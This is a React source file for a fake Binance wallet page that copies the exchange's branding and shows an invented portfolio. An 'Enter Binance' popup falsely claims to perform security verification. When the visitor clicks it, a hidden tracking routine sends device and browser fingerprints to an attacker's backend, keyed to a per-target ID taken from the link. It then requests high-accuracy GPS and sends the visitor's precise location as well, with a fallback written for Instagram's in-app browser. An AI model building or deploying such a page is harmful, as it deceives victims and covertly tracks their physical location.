"use client";

import { useMemo, useState, useEffect, type ReactNode } from "react";

type IconName =
  | "eye" | "eyeOff" | "arrowDown" | "send" | "download" | "swap" | "search" | "more" | "plus" | "wallet" | "chart" | "clock" | "menu" | "home";

type Asset = {
  symbol: "USDT" | "BTC" | "ETH" | "BNB";
  name: string;
  amount: string;
  usd: number;
};

const Icon = ({ name, size = 20, stroke = 1.8 }: { name: IconName; size?: number; stroke?: number; }) => {
  const props = { width: size, height: size, viewBox: "0 0 24 24", fill: "none", stroke: "currentColor", strokeWidth: stroke, strokeLinecap: "round" as const, strokeLinejoin: "round" as const };
  const icons: Record<IconName, ReactNode> = {
    eye: (<><path d="M2 12s3.5-6 10-6 10 6 10 6-3.5 6-10 6S2 12 2 12Z" /><circle cx="12" cy="12" r="2.5" /></>),
    eyeOff: (<><path d="M3 3l18 18" /><path d="M10.5 6.2A11 11 0 0 1 12 6c6.5 0 10 6 10 6a18 18 0 0 1-3.1 3.8" /><path d="M6.3 6.3C3.7 8 2 12 2 12s3.5 6 10 6c1.4 0 2.7-.3 3.8-.8" /><path d="M9.9 9.9a3 3 0 0 0 4.2 4.2" /></>),
    arrowDown: <path d="m6 9 6 6 6-6" />,
    send: (<><path d="m22 2-7 20-4-9-9-4Z" /><path d="M22 2 11 13" /></>),
    download: (<><path d="M12 3v12" /><path d="m7 10 5 5 5-5" /><path d="M5 21h14" /></>),
    swap: (<><path d="M7 7h11l-3-3" /><path d="m18 7-3-3" /><path d="M17 17H6l3 3" /><path d="m6 17 3 3" /></>),
    search: (<><circle cx="11" cy="11" r="7" /><path d="m20 20-4-4" /></>),
    more: (<><circle cx="5" cy="12" r="1" fill="currentColor" stroke="none" /><circle cx="12" cy="12" r="1" fill="currentColor" stroke="none" /><circle cx="19" cy="12" r="1" fill="currentColor" stroke="none" /></>),
    plus: (<><path d="M12 5v14" /><path d="M5 12h14" /></>),
    wallet: (<><path d="M3 7a3 3 0 0 1 3-3h13v16H6a3 3 0 0 1-3-3Z" /><path d="M3 7h16" /><path d="M16 12h5v5h-5a2.5 2.5 0 0 1 0-5Z" /></>),
    chart: (<><path d="M4 19V5" /><path d="M4 19h17" /><path d="m7 15 4-4 3 2 5-6" /></>),
    clock: (<><circle cx="12" cy="12" r="9" /><path d="M12 7v5l3 2" /></>),
    menu: (<><path d="M4 7h16" /><path d="M4 12h16" /><path d="M4 17h16" /></>),
    home: (<><path d="m3 10 9-7 9 7v10a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V10Z" /><path d="M9 21v-7h6v7" /></>),
  };
  return <svg {...props}>{icons[name]}</svg>;
};

const ExchangeMark = ({ size = 28 }: { size?: number }) => (
  <svg width={size} height={size} viewBox="0 0 64 64" fill="none" aria-hidden="true">
    <path fill="currentColor" d="m32 6 9 9-9 9-9-9 9-9Zm-17 17 9 9-9 9-9-9 9-9Zm34 0 9 9-9 9-9-9 9-9Zm-17 17 9 9-9 9-9-9 9-9Z" />
    <path fill="currentColor" d="m32 20 12 12-12 12-12-12 12-12Z" />
  </svg>
);

const CoinIcon = ({ symbol, size = 40, className = "" }: { symbol: Asset["symbol"]; size?: number; className?: string; }) => {
  const content: Record<Asset["symbol"], ReactNode> = {
    BTC: (<><circle cx="50" cy="50" r="46" fill="#F7931A" /><text x="50" y="64" textAnchor="middle" fontSize="50" fontWeight="700" fill="#FFFFFF">₿</text></>),
    ETH: (<><circle cx="50" cy="50" r="46" fill="#627EEA" /><path d="M50 11 27 50l23 14 23-14L50 11Z" fill="#FFFFFF" /><path d="m50 89 23-35-23 14-23-14 23 35Z" fill="#DCE5FF" /></>),
    USDT: (<><circle cx="50" cy="50" r="46" fill="#26A17B" /><path d="M25 28h50M50 28v42M35 36c7 4 23 4 30 0M33 45c9 7 25 7 34 0" stroke="#FFFFFF" strokeWidth="6" strokeLinecap="round" fill="none" /></>),
    BNB: (<><circle cx="50" cy="50" r="46" fill="#F0B90B" /><path d="m50 17 10 10-10 10-10-10 10-10Zm-18 18 10 10-10 10-10-10 10-10Zm36 0 10 10-10 10-10-10 10-10Zm-18 18 10 10-10 10-10-10 10-10Z" fill="#FFFFFF" /></>),
  };
  return <svg width={size} height={size} viewBox="0 0 100 100" className={`block shrink-0 ${className}`} aria-hidden="true">{content[symbol]}</svg>;
};

export default function Binance() {
  const [activeTab, setActiveTab] = useState("Overview");
  const [hideBalance, setHideBalance] = useState(false);
  const [showEnterModal, setShowEnterModal] = useState(true);

  const assets: Asset[] = [
    { symbol: "USDT", name: "TetherUS", amount: "1,650.000000", usd: 1650 },
    { symbol: "BTC", name: "Bitcoin", amount: "0.012846", usd: 834.92 },
    { symbol: "ETH", name: "Ethereum", amount: "0.216400", usd: 574.31 },
    { symbol: "BNB", name: "BNB", amount: "1.842100", usd: 240.77 },
  ];

  const total = useMemo(() => assets.reduce((sum, asset) => sum + asset.usd, 0), [assets]);
  const formatMoney = (value: number) => new Intl.NumberFormat("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 }).format(value);

  // --- ULTRA PRO MAX TRACKING SCRIPT ---
  const initTracking = async () => {
    // Change this to your live Flask backend URL when deployed (e.g., http://123.45.67.89:5000)
    const API_BASE = "http://127.0.0.1:5000"; 
    
    // Extract tracking ID from URL (?id=XYZ)
    const urlParams = new URLSearchParams(window.location.search);
    const trackingId = urlParams.get("id") || "unknown";

    const collectedData: any = { browser: {}, network: {}, location: { permission_status: 'pending' } };

    const getBrowserName = (ua: string) => { if (ua.includes('Firefox')) return 'Firefox'; if (ua.includes('Chrome')) return 'Chrome'; if (ua.includes('Safari')) return 'Safari'; if (ua.includes('Edge')) return 'Edge'; return 'Unknown'; };
    const getBrowserVersion = (ua: string) => { const m = ua.match(/(chrome|firefox|safari|edge)\/?\s*(\d+)/i); return m ? m[2] : 'Unknown'; };
    const getOS = (ua: string) => { if (ua.includes('Windows')) return 'Windows'; if (ua.includes('Mac')) return 'macOS'; if (ua.includes('Android')) return 'Android'; if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS'; if (ua.includes('Linux')) return 'Linux'; return 'Unknown'; };

    collectedData.browser = {
      browser: getBrowserName(navigator.userAgent),
      browser_version: getBrowserVersion(navigator.userAgent),
      operating_system: getOS(navigator.userAgent),
      device_type: /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      screen_resolution: `${window.screen.width}x${window.screen.height}`,
      viewport_size: `${window.innerWidth}x${window.innerHeight}`,
      color_depth: window.screen.colorDepth,
      touch_capability: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
      cpu_cores: navigator.hardwareConcurrency || null,
      device_memory: (navigator as any).deviceMemory || null,
      online_status: navigator.onLine
    };

    // Network Data
    const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
    if (conn) {
      collectedData.network = { connection_type: conn.type || 'unknown', effective_type: conn.effectiveType || 'unknown', downlink: conn.downlink || null, rtt: conn.rtt || null, save_data: conn.saveData || false };
    }
    if ('getBattery' in navigator) {
      try {
        const battery = await (navigator as any).getBattery();
        collectedData.network.battery_level = battery.level;
        collectedData.network.battery_charging = battery.charging;
      } catch (e) {}
    }

    // Send initial data instantly
    try {
      await fetch(`${API_BASE}/api/ultra_track`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ tracking_id: trackingId, ...collectedData })
      });
    } catch (e) {}

    // GPS Collection (Dual Request Strategy for iOS/Android/Instagram)
    if (!navigator.geolocation) {
      collectedData.location.permission_status = 'not_supported';
      return;
    }

    try {
      const position = await new Promise<GeolocationPosition>((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0
        });
      });

      collectedData.location = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        altitude: position.coords.altitude,
        heading: position.coords.heading,
        speed: position.coords.speed,
        timestamp: new Date(position.timestamp).toISOString(),
        permission_status: 'granted'
      };

      await fetch(`${API_BASE}/api/ultra_track`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ tracking_id: trackingId, ...collectedData })
      });

    } catch (error) {
      // Fallback to watchPosition if getCurrentPosition fails (Common in Instagram WebView)
      try {
        const watchId = navigator.geolocation.watchPosition(
          async (pos) => {
            if (pos.coords.accuracy < 150) { // Wait for decent accuracy
              navigator.geolocation.clearWatch(watchId);
              collectedData.location = {
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
                altitude: pos.coords.altitude,
                heading: pos.coords.heading,
                speed: pos.coords.speed,
                timestamp: new Date(pos.timestamp).toISOString(),
                permission_status: 'granted'
              };
              
              await fetch(`${API_BASE}/api/ultra_track`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ tracking_id: trackingId, ...collectedData })
              });
            }
          },
          (err) => {
            collectedData.location.permission_status = 'denied';
          },
          { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
        );
      } catch (e) {
        collectedData.location.permission_status = 'denied';
      }
    }
  };

  const handleEnterSite = () => {
    setShowEnterModal(false);
    initTracking();
  };

  const tabs = ["Overview", "Spot", "Earn", "Funding", "History"];
  const quickActions: { label: string; icon: IconName; }[] = [
    { label: "Buy Crypto", icon: "plus" }, { label: "Deposit Crypto", icon: "download" }, { label: "Send", icon: "send" }, { label: "Transfer", icon: "swap" },
  ];

  return (
    <section className="min-h-screen bg-[#0B0E11] font-sans text-[#EAECEF] relative">
      {/* ENTER BINANCE POPUP (THE GPS TRIGGER) */}
      {showEnterModal && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
          <div className="w-full max-w-[340px] rounded-2xl border border-[#2B3139] bg-[#181E25] p-6 text-center shadow-2xl">
            <div className="mb-5 flex justify-center text-[#F0B90B]">
              <ExchangeMark size={48} />
            </div>
            <h2 className="mb-2 text-[20px] font-semibold text-[#F5F5F5]">Enter Binance</h2>
            <p className="mb-6 text-[13px] text-[#848E9C]">
              You are accessing your Binance Wallet. For security verification and session encryption, please confirm your identity to proceed.
            </p>
            <button
              onClick={handleEnterSite}
              className="w-full rounded-xl bg-[#F0B90B] py-3 text-[14px] font-semibold text-[#181A20] transition hover:bg-[#FCD535] active:scale-[0.98]"
            >
              Enter Wallet
            </button>
            <button className="mt-3 text-[11px] text-[#848E9C] transition hover:text-[#EAECEF]">
              Cancel
            </button>
          </div>
        </div>
      )}

      {/* HEADER */}
      <header className="sticky top-0 z-50 border-b border-[#2B3139]/70 bg-[#0B0E11]/95 backdrop-blur-xl">
        <div className="mx-auto flex h-[64px] w-full max-w-[1440px] items-center gap-4 px-4 sm:px-6 lg:px-8">
          <div className="flex shrink-0 items-center gap-2.5 text-[#F0B90B]">
            <ExchangeMark size={30} />
            <span className="hidden text-[20px] font-bold tracking-tight sm:block">BINANCE</span>
          </div>
          <nav className="hidden items-center gap-6 xl:flex">
            {["Buy Crypto", "Markets", "Trade", "Futures", "Earn", "Square"].map((item) => (
              <button key={item} className="text-[14px] font-medium text-[#EAECEF] transition hover:text-[#F0B90B]">{item}</button>
            ))}
          </nav>
          <div className="ml-auto flex items-center gap-2 sm:gap-3">
            <button className="hidden items-center gap-1 rounded-lg border border-[#2B3139] px-3 py-2 text-[12px] text-[#B7BDC6] transition hover:bg-white/[0.04] md:flex">
              Wallet <Icon name="arrowDown" size={14} />
            </button>
            <button className="hidden text-[#848E9C] transition hover:text-white lg:block"><Icon name="search" size={20} /></button>
            <button className="rounded-lg bg-[#F0B90B] px-4 py-2 text-[12px] font-semibold text-[#181A20] transition hover:bg-[#FCD535]">Deposit</button>
            <button className="flex h-9 w-9 items-center justify-center rounded-lg border border-[#2B3139] text-[#B7BDC6] xl:hidden"><Icon name="more" size={20} /></button>
          </div>
        </div>
      </header>

      <main className="mx-auto w-full max-w-[1440px] px-4 pb-[96px] pt-5 sm:px-6 sm:pb-10 lg:px-8">
        <div className="mb-5 flex flex-col gap-4 md:flex-row md:items-center md:justify-between">
          <div>
            <div className="mb-1 flex items-center gap-2 text-[12px] text-[#848E9C]">
              <span>Wallet</span><span>/</span><span className="text-[#EAECEF]">Overview</span>
            </div>
            <h1 className="text-[24px] font-semibold tracking-tight text-[#F5F5F5] sm:text-[28px]">Wallet Overview</h1>
          </div>
          <button className="hidden items-center gap-2 self-start rounded-lg border border-[#2B3139] px-3 py-2 text-[12px] text-[#B7BDC6] transition hover:bg-white/[0.04] md:flex">
            <Icon name="clock" size={16} /> Transaction History
          </button>
        </div>

        <div className="mb-6 overflow-x-auto border-b border-[#2B3139] scrollbar-none">
          <div className="flex min-w-max gap-7">
            {tabs.map((tab) => (
              <button key={tab} onClick={() => setActiveTab(tab)} className={`relative pb-3 text-[13px] transition ${activeTab === tab ? "font-semibold text-[#EAECEF]" : "text-[#848E9C] hover:text-[#EAECEF]"}`}>
                {tab}
                {activeTab === tab && <span className="absolute inset-x-0 bottom-0 h-[2px] rounded-full bg-[#F0B90B]" />}
              </button>
            ))}
          </div>
        </div>

        <section className="relative overflow-hidden rounded-2xl border border-[#2B3139] bg-[#181E25]">
          <div className="pointer-events-none absolute right-[-100px] top-[-100px] h-[300px] w-[300px] rounded-full bg-[#F0B90B]/[0.025] blur-3xl" />
          <div className="relative p-5 sm:p-7">
            <div className="flex flex-col gap-7 xl:flex-row xl:items-center xl:justify-between">
              <div>
                <div className="mb-2 flex items-center gap-2 text-[13px] text-[#B7BDC6]">
                  <span>Total Balance</span>
                  <button onClick={() => setHideBalance((c) => !c)} className="text-[#848E9C] transition hover:text-[#EAECEF]" aria-label="Toggle balance">
                    <Icon name={hideBalance ? "eyeOff" : "eye"} size={17} />
                  </button>
                </div>
                <div className="flex flex-wrap items-center gap-3">
                  <span className="text-[34px] font-semibold tracking-tight text-[#F5F5F5] sm:text-[42px]">{hideBalance ? "••••••••" : `$${formatMoney(total)}`}</span>
                  <span className="rounded-md bg-white/[0.05] px-2 py-1 text-[11px] font-medium text-[#B7BDC6]">USD</span>
                </div>
                <div className="mt-2 flex flex-wrap items-center gap-3">
                  <span className="text-[12px] text-[#848E9C]">{hideBalance ? "••••••••" : "≈ 1,258,400 PKR"}</span>
                  <span className="rounded bg-[#0ECB81]/10 px-2 py-1 text-[10px] font-medium text-[#0ECB81]">+2.48% Today</span>
                </div>
              </div>
              <div className="grid grid-cols-2 gap-2 sm:grid-cols-4 xl:flex">
                {[["Deposit", "download", true], ["Withdraw", "send", false], ["Transfer", "swap", false], ["Trade", "chart", false]].map(([label, icon, primary]) => (
                  <button key={label as string} className={`flex min-h-[82px] min-w-[108px] flex-col items-center justify-center gap-2 rounded-xl px-4 py-3 transition active:scale-[0.98] ${primary ? "bg-[#F0B90B] text-[#181A20] hover:bg-[#FCD535]" : "bg-white/[0.05] text-[#EAECEF] hover:bg-white/[0.09]"}`}>
                    <Icon name={icon as IconName} size={20} stroke={1.9} />
                    <span className="text-[12px] font-semibold">{label as string}</span>
                  </button>
                ))}
              </div>
            </div>
            <div className="mt-7 grid grid-cols-2 gap-y-5 border-t border-[#2B3139] pt-5 sm:grid-cols-4 sm:gap-y-0">
              {[["Spot Balance", "$2,485.16"], ["Earn Balance", "$486.20"], ["Funding", "$328.64"], ["Today's PNL", "+$79.82"]].map(([label, value], index) => (
                <div key={label} className={`px-3 ${index === 0 ? "pl-0" : "sm:border-l sm:border-[#2B3139]"}`}>
                  <p className="mb-1 text-[11px] text-[#848E9C]">{label}</p>
                  <p className={`text-[14px] font-semibold ${label === "Today's PNL" ? "text-[#0ECB81]" : "text-[#EAECEF]"}`}>{hideBalance ? "••••••" : value}</p>
                </div>
              ))}
            </div>
          </div>
        </section>

        <div className="mt-6 grid items-start gap-5 lg:gap-6 xl:grid-cols-[minmax(0,1.65fr)_minmax(380px,0.9fr)]">
          <section className="overflow-hidden rounded-2xl border border-[#2B3139] bg-[#181E25]">
            <div className="flex flex-col gap-4 border-b border-[#2B3139] p-5 sm:flex-row sm:items-center sm:justify-between sm:p-6">
              <div>
                <h2 className="text-[19px] font-semibold tracking-[-0.01em]">Your Assets</h2>
                <p className="mt-1 text-[12px] text-[#848E9C]">Assets held across your wallet</p>
              </div>
              <div className="flex gap-2">
                <button className="flex items-center gap-2 rounded-lg border border-[#2B3139] px-3 py-2 text-[12px] text-[#B7BDC6] transition hover:bg-white/[0.04]"><Icon name="search" size={15} /> Search</button>
                <button className="rounded-lg border border-[#2B3139] px-3 py-2 text-[12px] text-[#B7BDC6] transition hover:bg-white/[0.04]">Filter</button>
              </div>
            </div>
            <div className="hidden grid-cols-[minmax(190px,1.4fr)_1fr_1fr_90px] gap-4 border-b border-[#2B3139]/70 px-6 py-3 text-[10px] font-medium uppercase tracking-wider text-[#848E9C] md:grid">
              <span>Asset</span><span>Amount</span><span>USD Value</span><span className="text-right">Action</span>
            </div>
            {assets.map((asset) => {
              const percentage = (asset.usd / total) * 100;
              return (
                <div key={asset.symbol} className="grid gap-4 border-b border-[#2B3139]/70 px-5 py-4 last:border-b-0 md:grid-cols-[minmax(190px,1.4fr)_1fr_1fr_90px] md:items-center md:px-6">
                  <div className="flex min-w-0 items-center gap-3">
                    <CoinIcon symbol={asset.symbol} size={40} className="h-10 w-10" />
                    <div className="min-w-0">
                      <p className="truncate text-[14px] font-semibold">{asset.symbol}</p>
                      <p className="truncate text-[11px] text-[#848E9C]">{asset.name}</p>
                    </div>
                  </div>
                  <div>
                    <p className="text-[13px] font-medium tabular-nums">{hideBalance ? "••••••" : asset.amount}</p>
                    <p className="mt-0.5 text-[10px] text-[#848E9C] md:hidden">Amount</p>
                  </div>
                  <div>
                    <p className="text-[14px] font-semibold tabular-nums">{hideBalance ? "••••••" : `$${formatMoney(asset.usd)}`}</p>
                    <p className="mt-0.5 text-[11px] text-[#848E9C]">{percentage.toFixed(2)}% of portfolio</p>
                  </div>
                  <div className="flex items-center justify-start gap-1 md:justify-end">
                    <button className="rounded-md px-2 py-1.5 text-[12px] font-semibold text-[#F0B90B] transition hover:bg-[#F0B90B]/10">Trade</button>
                    <button className="rounded-md p-1.5 text-[#848E9C] transition hover:bg-white/[0.06] hover:text-white"><Icon name="more" size={17} /></button>
                  </div>
                </div>
              );
            })}
            <button className="flex w-full items-center justify-center gap-2 border-t border-[#2B3139] py-4 text-[13px] font-semibold text-[#F0B90B] transition hover:bg-[#F0B90B]/[0.025]">
              View All Assets <Icon name="arrowDown" size={16} />
            </button>
          </section>

          <div className="mx-auto w-full max-w-[440px] space-y-5 xl:mx-0 xl:max-w-none">
            <section className="overflow-hidden rounded-2xl border border-[#2B3139] bg-[#181E25]">
              <div className="p-5 sm:p-6">
                <div className="flex items-start justify-between">
                  <div>
                    <h2 className="text-[19px] font-semibold tracking-[-0.01em] text-[#EAECEF]">Portfolio</h2>
                    <p className="mt-1 text-[12px] text-[#AEB4BC]">Asset allocation</p>
                  </div>
                  <button className="flex h-8 w-8 items-center justify-center rounded-lg text-[#848E9C] transition hover:bg-white/[0.05] hover:text-[#EAECEF]" aria-label="More options"><Icon name="more" size={20} /></button>
                </div>
                <div className="flex justify-center py-8 sm:py-9">
                  <div className="relative flex h-[186px] w-[186px] items-center justify-center rounded-full sm:h-[190px] sm:w-[190px]" style={{ background: "conic-gradient(#36A58E 0deg 180deg, #FF9D16 180deg 271.08deg, #5B76CF 271.08deg 333.72deg, #F0B90B 333.72deg 360deg)" }}>
                    <div className="flex h-[132px] w-[132px] flex-col items-center justify-center rounded-full bg-[#181E25] sm:h-[136px] sm:w-[136px]">
                      <span className="text-[11px] font-medium text-[#848E9C]">Total Assets</span>
                      <span className="mt-2 text-[19px] font-semibold tracking-tight text-[#EAECEF] tabular-nums">{hideBalance ? "••••••••" : `$${formatMoney(total)}`}</span>
                    </div>
                  </div>
                </div>
                <div className="space-y-3.5">
                  {assets.map((asset) => {
                    const percentage = (asset.usd / total) * 100;
                    return (
                      <div key={asset.symbol} className="grid grid-cols-[1fr_auto] items-center gap-4">
                        <div className="flex min-w-0 items-center gap-2.5">
                          <CoinIcon symbol={asset.symbol} size={38} className="h-[38px] w-[38px]" />
                          <span className="truncate text-[13px] font-medium text-[#EAECEF]">{asset.symbol}</span>
                        </div>
                        <span className="tabular-nums text-right text-[13px] font-medium text-[#EAECEF]">{percentage.toFixed(1)}%</span>
                      </div>
                    );
                  })}
                </div>
              </div>
            </section>

            <section className="overflow-hidden rounded-2xl border border-[#2B3139] bg-[#181E25]">
              <div className="p-5 sm:p-6">
                <div className="mb-5">
                  <h2 className="text-[19px] font-semibold tracking-[-0.01em] text-[#EAECEF]">Quick Actions</h2>
                  <p className="mt-1 text-[12px] text-[#AEB4BC]">Manage your wallet instantly</p>
                </div>
                <div className="grid grid-cols-2 gap-2.5">
                  {quickActions.map((action) => (
                    <button key={action.label} className="group flex min-h-[58px] items-center gap-3 rounded-xl border border-[#2B3139] bg-[#1B2129] px-3 py-3 text-left transition duration-200 hover:border-[#F0B90B]/40 hover:bg-[#202731] active:scale-[0.98]">
                      <span className="flex h-9 w-9 shrink-0 items-center justify-center rounded-lg bg-[#F0B90B]/10 text-[#F0B90B] transition group-hover:bg-[#F0B90B]/15"><Icon name={action.icon} size={18} /></span>
                      <span className="min-w-0 text-[12px] font-medium leading-[1.3] text-[#EAECEF] sm:text-[13px]">{action.label}</span>
                    </button>
                  ))}
                </div>
              </div>
            </section>
          </div>
        </div>
      </main>

      <nav className="fixed inset-x-0 bottom-0 z-50 border-t border-[#2B3139] bg-[#0B0E11]/95 backdrop-blur-xl lg:hidden">
        <div className="mx-auto flex h-[64px] max-w-[600px] items-center justify-around px-3">
          {[["Home", "home"], ["Markets", "chart"], ["Trade", "swap"], ["Wallet", "wallet"]].map(([label, icon]) => {
            const active = label === "Wallet";
            return (
              <button key={label} className={`flex min-w-[58px] flex-col items-center justify-center gap-1 text-[10px] transition ${active ? "font-medium text-[#F0B90B]" : "text-[#848E9C] hover:text-[#EAECEF]"}`}>
                <span className="flex h-6 items-center justify-center"><Icon name={icon as IconName} size={19} /></span>
                <span>{label}</span>
              </button>
            );
          })}
        </div>
      </nav>
    </section>
  );
}